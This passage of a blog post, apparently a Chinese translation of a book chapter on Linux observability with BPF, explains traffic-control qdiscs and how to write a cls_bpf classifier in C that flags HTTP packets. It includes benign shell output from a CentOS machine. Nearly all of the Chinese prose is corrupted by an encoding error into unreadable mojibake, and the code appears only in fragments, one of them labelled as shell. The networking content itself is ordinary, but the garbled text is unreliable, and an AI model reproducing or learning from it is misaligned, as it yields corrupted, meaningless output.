ç±»çš„ï¼Œå°†æ•°æ®åŒ…å…¥é˜Ÿåˆ°ä¸‰ä¸ªFIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰é˜Ÿåˆ—ä¸­ï¼Œè¿™äº›é˜Ÿåˆ—æ ¹æ®å®ƒä»¬çš„ä¼˜å…ˆçº§å‡ºé˜Ÿï¼›æ­¤<code>qdisc</code>ä¸ç”¨äºè™šæ‹Ÿè®¾å¤‡ï¼Œä¾‹å¦‚ä½¿ç”¨<code>noqueue</code>çš„ç¯å›(lo)æˆ–è™šæ‹Ÿä»¥å¤ªç½‘è®¾å¤‡(veth)ã€‚é™¤äº†ä½œä¸ºå…¶è°ƒåº¦ç®—æ³•çš„é»˜è®¤å€¼å¤–ï¼Œ<code>pfifo_fast</code>ä¹Ÿä¸éœ€è¦ä»»ä½•é…ç½®å³å¯å·¥ä½œã€‚</p><p>é€šè¿‡è®¿é—®<code>/sys</code>ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¯ä»¥å°†è™šæ‹Ÿæ¥å£ä¸ç‰©ç†æ¥å£ï¼ˆè®¾å¤‡ï¼‰åŒºåˆ†å¼€æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ls -la /sys/class/net/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  2 root root 0 May 16 20:00 .</span><br><span class="line">drwxr-xr-x 66 root root 0 May 16 20:00 ..</span><br><span class="line">lrwxrwxrwx  1 root root 0 May 16 20:00 eth0 -&gt; ../../devices/pci0000:00/0000:00:05.0/virtio0/net/eth0</span><br><span class="line">lrwxrwxrwx  1 root root 0 May 16 20:00 lo -&gt; ../../devices/virtual/net/lo</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ ä»æœªå¬è¯´è¿‡<code>qdiscs</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>ip a</code>å‘½ä»¤æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­é…ç½®çš„ç½‘ç»œæ¥å£åˆ—è¡¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>ä»ä¸Šè¿°ç»“æœæˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p><ul><li>åœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸­æœ‰ä¸¤ä¸ªç½‘ç»œæ¥å£ï¼š<code>loå’Œeth0</code></li><li><code>lo</code>æ¥å£æ˜¯ä¸€ä¸ªè™šæ‹Ÿæ¥å£ï¼Œæ‰€ä»¥å®ƒæ˜¯<code>qdisc noqueue</code></li><li><code>eth0</code>æ˜¯ä¸€ä¸ªç‰©ç†æ¥å£ã€‚ è¿™é‡Œçš„<code>qdisc</code>æ˜¯<code>fq_codel</code>ï¼ˆå…¬å¹³é˜Ÿåˆ—æ§åˆ¶å»¶è¿Ÿï¼‰é»˜è®¤ä¸åº”è¯¥æ˜¯ <code>pfifo_fast</code>å—ï¼Ÿ äº‹å®è¯æ˜ï¼Œæˆ‘ä»¬æ­£åœ¨æµ‹è¯•å‘½ä»¤çš„ç³»ç»Ÿæ­£åœ¨è¿è¡Œ<code>Systemd</code>ï¼Œå®ƒä½¿ç”¨å†…æ ¸å‚æ•°<code>net.core.default_qdisc</code>ä»¥ä¸åŒçš„æ–¹å¼è®¾ç½®é»˜è®¤<code>qdisc</code>ã€‚</li></ul><p><code>noqueue qdisc</code>æ²¡æœ‰ç±»ã€è°ƒåº¦ç¨‹åºæˆ–åˆ†ç±»å™¨ã€‚å®ƒçš„ä½œç”¨æ˜¯å°è¯•ç«‹å³å‘é€æ•°æ®åŒ…ã€‚å¦‚å‰æ‰€è¿°ï¼Œè™šæ‹Ÿè®¾å¤‡é»˜è®¤ä½¿ç”¨<code>noqueue</code>ï¼Œä½†å½“ä½ åˆ é™¤å…¶å½“å‰å…³è”çš„<code>qdisc</code>æ—¶ï¼Œå®ƒä¹Ÿæ˜¯å¯¹ä»»ä½•æ¥å£ç”Ÿæ•ˆçš„ã€‚</p><p><code>fq_codel</code>æ˜¯ä¸€ä¸ªæ— ç±»åˆ«çš„<code>qdisc</code>ï¼Œå®ƒä½¿ç”¨éšæœºæ¨¡å‹å¯¹ä¼ å…¥çš„æ•°æ®åŒ…è¿›è¡Œåˆ†ç±»ï¼Œä»¥ä¾¿èƒ½å¤Ÿä»¥å…¬å¹³çš„æ–¹å¼å¯¹æµé‡è¿›è¡Œæ’é˜Ÿã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨ipå‘½ä»¤æ¥æŸ¥æ‰¾æœ‰å…³<code>qdiscs</code>çš„ä¿¡æ¯ï¼Œä½†äº‹å®è¯æ˜ï¼Œåœ¨<code>iproute2</code>å·¥å…·ä¸­è¿˜æœ‰ä¸€ä¸ªåä¸ºtcçš„å·¥å…·ï¼Œå®ƒå…·æœ‰<code>qdiscs</code>çš„ç‰¹å®šå­å‘½ä»¤ï¼ŒæŸ¥çœ‹æ–¹å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt6]# tc qdisc ls</span><br><span class="line">qdisc noqueue 0: dev lo root refcnt 2 </span><br><span class="line">qdisc fq_codel 0: dev eth0 root refcnt 2 limit 10240p flows 1024 quantum 1514 target 5ms interval 100ms memory_limit 32Mb ecn drop_batch 64</span><br></pre></td></tr></table></figure><p>å¯¹äº<code>lo</code>ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šçœ‹åˆ°ä¸<code>ip a</code>ç›¸åŒçš„ä¿¡æ¯ï¼Œä½†å¯¹äº<code>eth0</code>ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li>å®ƒæœ‰èƒ½å¤Ÿå¤„ç†10240ä¸ªä¼ å…¥æ•°æ®åŒ…çš„é™åˆ¶ã€‚</li><li>å¦‚å‰æ‰€è¿°ï¼Œ<code>fq_codel</code>ä½¿ç”¨çš„éšæœºæ¨¡å‹å¸Œæœ›å°†æµé‡æ’é˜Ÿåˆ°ä¸åŒçš„æµä¸­ï¼Œæ­¤è¾“å‡ºåŒ…å«æœ‰å…³æˆ‘ä»¬æ‹¥æœ‰å¤šå°‘ä¸ªæµçš„ä¿¡æ¯ï¼Œå³1024ã€‚</li></ul><p>åœ¨ä¸‹ä¸€èŠ‚ä¸­æˆ‘ä»¬å¯ä»¥ä»”ç»†ç ”ç©¶æœ‰ç±»å’Œæ— ç±»<code>qdiscs</code>ä»¥äº†è§£å®ƒä»¬çš„åŒºåˆ«ä»¥åŠå“ªäº›é€‚åˆBPFç¨‹åºã€‚</p><h5 id="Classful-qdiscs-filters-and-classes"><a href="#Classful-qdiscs-filters-and-classes" class="headerlink" title="Classful qdiscs, filters, and classes"></a>Classful qdiscs, filters, and classes</h5><p><code>Classful qdiscs</code>å…è®¸ä¸ºä¸åŒç±»å‹çš„æµé‡å®šä¹‰ç±»ï¼Œä»¥ä¾¿å¯¹å®ƒä»¬åº”ç”¨ä¸åŒçš„è§„åˆ™ã€‚æ‹¥æœ‰ä¸€ä¸ª <code>qdisc</code>çš„ç±»æ„å‘³ç€å®ƒå¯ä»¥åŒ…å«æ›´å¤šçš„<code>qdisc</code>ã€‚æœ‰äº†è¿™ç§å±‚æ¬¡ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨ï¼ˆåˆ†ç±»å™¨ï¼‰é€šè¿‡ç¡®å®šæ•°æ®åŒ…åº”è¯¥å…¥é˜Ÿçš„ä¸‹ä¸€ä¸ªç±»åˆ«æ¥å¯¹æµé‡è¿›è¡Œåˆ†ç±»ã€‚</p><p>è¿‡æ»¤å™¨ç”¨äºæ ¹æ®æ•°æ®åŒ…çš„ç±»å‹å°†æ•°æ®åŒ…åˆ†é…ç»™ç‰¹å®šçš„ç±»ã€‚ è¿‡æ»¤å™¨åœ¨ä¸€ä¸ªæœ‰ç±»çš„<code>qdiscs</code>ä¸­ç”¨äºç¡®å®šæ•°æ®åŒ…åº”è¯¥åœ¨å“ªä¸ªç±»ä¸­æ’é˜Ÿï¼Œå¹¶ä¸”ä¸¤ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨å¯ä»¥æ˜ å°„åˆ°åŒä¸€ä¸ªç±»ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ æ¯ä¸ªè¿‡æ»¤å™¨éƒ½ä½¿ç”¨åˆ†ç±»å™¨æ ¹æ®æ•°æ®åŒ…çš„ä¿¡æ¯å¯¹æ•°æ®åŒ…è¿›è¡Œåˆ†ç±»ã€‚</p><p><img src="/2022/05/29/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸‹ç¯‡-ç¿»è¯‘/2.png" alt="2"></p><p>å¦‚å‰æ‰€è¿°ï¼Œ<code>cls_bpf</code>æ˜¯æˆ‘ä»¬æƒ³ç”¨æ¥ä¸ºæµé‡æ§åˆ¶ç¼–å†™BPFç¨‹åºçš„åˆ†ç±»å™¨â€”â€”ä¸‹ä¸€èŠ‚ä¸­æœ‰ä¸€ä¸ªå…·ä½“çš„ä¾‹å­æ¥è¯´æ˜å¦‚ä½•ä½¿ç”¨å®ƒã€‚</p><p><code>Classes</code>æ˜¯åªèƒ½å­˜åœ¨äºæœ‰ç±»<code>qdisc</code>ä¸­çš„å¯¹è±¡ï¼›<code>Classes</code>åœ¨äº¤é€šæ§åˆ¶ä¸­ç”¨äºåˆ›å»ºå±‚æ¬¡ç»“æ„ã€‚ä¸€ä¸ªç±»å¯ä»¥é™„åŠ è¿‡æ»¤å™¨ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å¤æ‚çš„å±‚æ¬¡ç»“æ„ï¼Œç„¶åå¯ä»¥å°†å…¶ç”¨ä½œå¦ä¸€ä¸ª<code>class</code>æˆ–<code>qdisc</code>çš„å…¥å£ç‚¹ã€‚</p><h5 id="Classless-qdiscs"><a href="#Classless-qdiscs" class="headerlink" title="Classless qdiscs"></a>Classless qdiscs</h5><p>æ— ç±»çš„<code>qdisc</code>ä¸èƒ½æœ‰ä»»ä½•å­©å­çš„<code>qdisc</code>ï¼Œå› ä¸ºå®ƒä¸å…è®¸æœ‰ä»»ä½•å…³è”çš„ç±»ã€‚è¿™æ„å‘³ç€ä¸å¯èƒ½å°†è¿‡æ»¤å™¨é™„åŠ åˆ°æ— ç±»<code>qdisc</code>ã€‚æˆ‘ä»¬ä¸èƒ½ç»™å®ƒä»¬æ·»åŠ è¿‡æ»¤å™¨å’Œåˆ†ç±»å™¨ï¼Œä»BPFçš„è§’åº¦æ¥çœ‹ï¼Œæ— ç±» <code>qdisc</code>å¹¶ä¸æœ‰è¶£ï¼Œä½†å¯¹äºç®€å•çš„æµé‡æ§åˆ¶éœ€æ±‚ä»ç„¶æœ‰ç”¨ã€‚</p><p>åœ¨ç§¯ç´¯äº†ä¸€äº›å…³äº<code>qdiscs</code>ã€è¿‡æ»¤å™¨å’Œç±»çš„çŸ¥è¯†ä¹‹åï¼Œæˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•ä¸º<code>cls_bpf</code>åˆ†ç±»å™¨ç¼–å†™BPFç¨‹åºã€‚</p><h4 id="ä½¿ç”¨cls-bpfçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨ç¨‹åº"><a href="#ä½¿ç”¨cls-bpfçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨ç¨‹åº" class="headerlink" title="ä½¿ç”¨cls_bpfçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨ç¨‹åº"></a>ä½¿ç”¨cls_bpfçš„æµé‡æ§åˆ¶åˆ†ç±»å™¨ç¨‹åº</h4><p>æµé‡æ§åˆ¶æ˜¯ä¸€ç§å¼ºå¤§çš„æœºåˆ¶ï¼Œåˆ†ç±»å™¨ä½¿å¾—å®ƒå˜å¾—æ›´åŠ å¼ºå¤§ï¼›ä½†æ˜¯ï¼Œåœ¨æ‰€æœ‰åˆ†ç±»å™¨ä¸­ï¼Œæœ‰ä¸€ä¸ªå…è®¸ä½ å¯¹ç½‘ç»œæ•°æ®è·¯å¾„<code>cls_bpf</code>åˆ†ç±»å™¨è¿›è¡Œç¼–ç¨‹ã€‚è¿™ä¸ªåˆ†ç±»å™¨å¾ˆç‰¹åˆ«ï¼Œå› ä¸ºå®ƒå¯ä»¥è¿è¡ŒBPFç¨‹åºï¼Œè¿™æ„å‘³ç€<code>cls_bpf</code>å°†å…è®¸ä½ ç›´æ¥åœ¨å…¥å£å’Œå‡ºå£å±‚ä¸­<code>hook</code>BPFç¨‹åºï¼Œå¹¶ä¸”è¿è¡Œ<code>hook</code>åˆ°è¿™äº›å±‚çš„BPFç¨‹åºèƒ½å¤Ÿè®¿é—®ç›¸åº”æ•°æ®åŒ…çš„<code>sk_buff</code>ç»“æ„ã€‚</p><p>ä¸ºäº†æ›´å¥½åœ°ç†è§£æµé‡æ§åˆ¶å’ŒBPFç¨‹åºä¹‹é—´çš„è¿™ç§å…³ç³»ï¼Œè¯·å‚è§ä¸‹å›¾ä½¿ç”¨æµé‡æ§åˆ¶åŠ è½½BPFç¨‹åºï¼Œå®ƒæ˜¾ç¤ºäº†å¦‚ä½•æ ¹æ®<code>cls_bpf</code>åˆ†ç±»å™¨åŠ è½½BPFç¨‹åºã€‚</p><p><img src="/2022/05/29/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸‹ç¯‡-ç¿»è¯‘/3.png" alt="3"></p><p> ä½ ä¼šæ³¨æ„åˆ°æ­¤ç±»ç¨‹åºè¢«<code>hook</code>åˆ°å…¥å£å’Œå‡ºå£<code>qdiscs</code>ã€‚è¿˜æè¿°äº†ä¸Šä¸‹æ–‡ä¸­çš„å…¶ä»–äº¤äº’ã€‚é€šè¿‡å°†ç½‘ç»œæ¥å£ä½œä¸ºç½‘ç»œæµé‡çš„å…¥å£ç‚¹ï¼Œä½ ä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>æµé‡é¦–å…ˆè¿›å…¥æµé‡æ§åˆ¶çš„å…¥å£é’©å­ã€‚</li><li>ç„¶åå†…æ ¸å°†ä¸ºæ¯ä¸ªè¿›å…¥çš„è¯·æ±‚æ‰§è¡Œä»ç”¨æˆ·ç©ºé—´åŠ è½½åˆ°å…¥å£çš„BPFç¨‹åºã€‚</li><li>å…¥å£ç¨‹åºæ‰§è¡Œåï¼Œæ§åˆ¶æƒäº¤ç»™ç½‘ç»œå †æ ˆï¼Œé€šçŸ¥ç”¨æˆ·åº”ç”¨ç¨‹åºæœ‰å…³ç½‘ç»œäº‹ä»¶ã€‚</li><li>åœ¨åº”ç”¨ç¨‹åºç»™å‡ºå“åº”åï¼Œæ§åˆ¶æƒä¼šé€šè¿‡å¦ä¸€ä¸ªæ‰§è¡Œçš„BPFç¨‹åºä¼ é€’ç»™<code>Traffic Control</code>çš„å‡ºå£ï¼Œå¹¶åœ¨å®Œæˆåå°†æ§åˆ¶æƒäº¤è¿˜ç»™å†…æ ¸ã€‚</li><li>ç»™å®¢æˆ·ç«¯ä¸€ä¸ªå“åº”ã€‚</li></ul><p>ä½ å¯ä»¥ä½¿ç”¨Cè¯­è¨€ç¼–å†™ç”¨äºæµé‡æ§åˆ¶çš„BPFç¨‹åºï¼Œå¹¶ä½¿ç”¨å¸¦æœ‰BPFåç«¯çš„LLVM/Clangç¼–è¯‘å®ƒä»¬ã€‚</p><p>ä¸ºäº†ä½¿è¿™ä¸ªä¾‹å­å·¥ä½œï¼Œä½ éœ€è¦åœ¨ä¸€ä¸ªç›´æ¥ç”¨<code>cls_bpf</code>ç¼–è¯‘çš„å†…æ ¸ä¸Šè¿è¡Œå®ƒï¼Œæˆ–è€…ä½œä¸ºä¸€ä¸ªæ¨¡å—è¿è¡Œå®ƒã€‚è¦éªŒè¯æ˜¯å¦æ‹¥æœ‰æ‰€éœ€çš„ä¸€åˆ‡ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/config.gz| zcat | grep -i BPF</span><br></pre></td></tr></table></figure><p>æŠ¥é”™å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# cat /proc/config.gz| zcat | grep -i BPF</span><br><span class="line">cat: /proc/config.gz: No such file or directory</span><br></pre></td></tr></table></figure><p>å¯¹æ­¤æˆ‘ä»¬å¯ä»¥ä»ç³»ç»Ÿ<code>/usr/src/kernel</code>ç›®å½•ä¸‹è·å–</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ç¡®ä¿è‡³å°‘å¾—åˆ°ä»¥ä¸‹å¸¦æœ‰ y æˆ– m çš„è¾“å‡ºï¼š[root@VM-16-14-centos ~]# uname -r</span><br><span class="line">5.17.8-1.el8.elrepo.x86_64</span><br><span class="line">[root@VM-16-14-centos ~]# cd /usr/src/kernels/5.17.8-1.el8.elrepo.x86_64/</span><br><span class="line">[root@VM-16-14-centos 5.17.8-1.el8.elrepo.x86_64]# cat .config | grep -i BPF</span><br><span class="line">CONFIG_BPF=y</span><br><span class="line">CONFIG_HAVE_EBPF_JIT=y</span><br><span class="line">CONFIG_ARCH_WANT_DEFAULT_BPF_JIT=y</span><br><span class="line">CONFIG_BPF_SYSCALL=y</span><br><span class="line">CONFIG_BPF_JIT=y</span><br><span class="line">CONFIG_BPF_JIT_ALWAYS_ON=y</span><br><span class="line">CONFIG_BPF_JIT_DEFAULT_ON=y</span><br><span class="line">CONFIG_CGROUP_BPF=y</span><br><span class="line">CONFIG_NETFILTER_XT_MATCH_BPF=m</span><br><span class="line">CONFIG_NET_CLS_BPF=m</span><br><span class="line">CONFIG_NET_ACT_BPF=m</span><br><span class="line">CONFIG_BPF_EVENTS=y</span><br></pre></td></tr></table></figure><p>ç¡®ä¿è‡³å°‘å¾—åˆ°ä»¥ä¸‹å¸¦æœ‰<code>y</code>æˆ–<code>m</code>çš„è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_BPF=y</span><br><span class="line">CONFIG_BPF_SYSCALL=y</span><br><span class="line">CONFIG_NET_CLS_BPF=m</span><br><span class="line">CONFIG_BPF_JIT=y</span><br><span class="line">CONFIG_HAVE_EBPF_JIT=y</span><br><span class="line">CONFIG_BPF_EVENTS=y</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ç¼–å†™åˆ†ç±»å™¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"classifier"</span>)</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">classification</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end; </span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">__u16 h_proto;</span><br><span class="line">__u64 nh_off = <span class="number">0</span>; </span><br><span class="line">  nh_off = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line"><span class="keyword">if</span> (data + nh_off &gt; data_end) &#123; </span><br><span class="line">    <span class="keyword">return</span> TC_ACT_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ†ç±»å™¨ä¸»è¦æ˜¯åˆ†ç±»åŠŸèƒ½ã€‚è¿™ä¸ªå‡½æ•°ç”¨ä¸€ä¸ªç§°ä¸º<code>classifier</code>çš„èŠ‚æ ‡é¢˜è¿›è¡Œæ³¨é‡Šï¼Œä»¥ä¾¿<code>tc</code>å¯ä»¥çŸ¥é“è¿™æ˜¯è¦ä½¿ç”¨çš„åˆ†ç±»å™¨ã€‚</p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä»<code>skb</code>ä¸­æå–ä¸€äº›ä¿¡æ¯ï¼›æ•°æ®æˆå‘˜åŒ…å«å½“å‰æ•°æ®åŒ…çš„æ‰€æœ‰æ•°æ®åŠå…¶æ‰€æœ‰åè®®ç»†èŠ‚ã€‚ä¸ºäº†è®©æˆ‘ä»¬å†™çš„ç¨‹åºçŸ¥é“å…¶ä¸­çš„å†…å®¹ï¼Œéœ€è¦å°†å…¶è½¬æ¢ä¸ºä»¥å¤ªç½‘å¸§ï¼ˆåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œä½¿ç”¨ <code>*eth</code>å˜é‡ï¼‰ã€‚ä¸ºäº†è®©é™æ€éªŒè¯å™¨æ»¡æ„ï¼Œæˆ‘ä»¬éœ€è¦æ£€æŸ¥æ•°æ®ï¼ŒåŠ ä¸Š<code>eth</code>æŒ‡é’ˆçš„å¤§å°ï¼Œä¸è¶…è¿‡ <code>data_end</code>æ‰€åœ¨çš„ç©ºé—´ã€‚ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä»<code>*eth</code>ä¸­çš„<code>h_proto</code>æˆå‘˜ä¸­è·å–åè®®ç±»å‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (h_proto == bpf_htons(ETH_P_IP)) &#123; </span><br><span class="line">if (is_http(skb, nh_off) == 1) &#123;</span><br><span class="line">trace_printk("Yes! It is HTTP!\n"); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return TC_ACT_OK; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰äº†åè®®åï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸»æœºè½¬æ¢å®ƒï¼Œæ£€æŸ¥å®ƒæ˜¯å¦å’Œæˆ‘ä»¬çš„IPv4åè®®ç›¸ç­‰ï¼Œå¦‚æœæ˜¯ï¼Œæˆ‘ä»¬ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„<code>is_http</code>å‡½æ•°æ£€æŸ¥å†…éƒ¨æ•°æ®åŒ…æ˜¯å¦ä¸ºHTTPï¼Œå¦‚æœæ˜¯HTTPçš„è¯ï¼Œæˆ‘ä»¬æ‰“å°ä¸€æ¡è°ƒè¯•æ¶ˆæ¯ï¼Œè¯´æ˜æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªHTTPæ•°æ®åŒ…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data_end; </span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)skb-&gt;data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> = <span class="title">data</span> + <span class="title">nh_off</span>;</span></span><br><span class="line"><span class="keyword">if</span> (iph + <span class="number">1</span> &gt; data_end) &#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (iph-&gt;protocol != IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__u32 tcp_hlen = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><code>is_http</code>å‡½æ•°ç±»ä¼¼äºæˆ‘ä»¬çš„åˆ†ç±»å™¨å‡½æ•°ï¼Œä½†å®ƒä¼šé€šè¿‡å·²çŸ¥çš„IPv4åè®®æ•°æ®çš„èµ·å§‹åç§»é‡æ¥ä»<code>skb</code>å¼€å§‹ã€‚æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æ‰€åšçš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä½¿ç”¨<code>*iph</code>å˜é‡è®¿é—®IPåè®®æ•°æ®ä¹‹å‰è¿›è¡Œæ£€æŸ¥ï¼Œä»¥è®©é™æ€éªŒè¯è€…çŸ¥é“æˆ‘ä»¬çš„ç›®çš„ã€‚å®Œæˆåï¼Œæˆ‘ä»¬åªéœ€æ£€æŸ¥IPv4å¤´æ˜¯å¦åŒ…å«TCPæ•°æ®åŒ…ï¼Œä»¥ä¾¿æˆ‘ä»¬ç»§ç»­ã€‚å¦‚æœæ•°æ®åŒ…çš„åè®®æ˜¯<code>IPPROTO_TCP</code>ç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦å†æ¬¡è¿›è¡Œä¸€äº›æ£€æŸ¥ä»¥è·å–<code>*tcph</code>å˜é‡ä¸­çš„å®é™…TCPå¤´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">plength = ip_total_length - ip_hlen - tcp_hlen; </span><br><span class="line"><span class="keyword">if</span> (plength &gt;= <span class="number">7</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> p[<span class="number">7</span>]; </span><br><span class="line">  <span class="keyword">int</span> i=<span class="number">0</span>; </span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">      p[i] = load_byte(skb, poffset + i);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">int</span> *value;</span><br><span class="line"><span class="keyword">if</span> ((p[<span class="number">0</span>] == <span class="string">'H'</span>) &amp;&amp; (p[<span class="number">1</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">2</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">3</span>] == <span class="string">'P'</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å¾—TCPå¤´ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä»<code>skb</code>ç»“æ„ä¸­åŠ 